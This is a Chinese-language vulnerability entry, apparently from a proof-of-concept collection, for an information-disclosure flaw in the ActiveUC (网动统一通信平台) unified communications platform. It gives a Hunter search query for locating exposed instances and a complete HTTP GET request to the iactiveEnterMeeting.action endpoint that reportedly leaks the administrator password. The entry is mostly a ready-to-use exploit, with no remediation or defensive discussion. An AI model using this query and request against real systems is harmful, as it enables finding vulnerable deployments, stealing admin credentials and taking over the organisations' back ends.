## 网动统一通信平台(ActiveUC)接口iactiveEnterMeeting存在信息泄露漏洞

网动统一通信平台是采用统一的通信界面，将VoIP电话系统、电子邮件等多种沟通方式融合的企业IT平台，接口 `/acenter/iactiveEnterMeeting.action?roomid=1&username=admin` 存在信息泄露漏洞，可能导致管理员密码泄露获取后台权限等。

## hunter

```javascript
web.title=="网动统一通信平台(Active UC)"
```


## poc
```javascript
GET /acenter/iactiveEnterMeeting.action?roomid=1&username=admin HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
```

![image-20241014095902804](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410140959976.png)
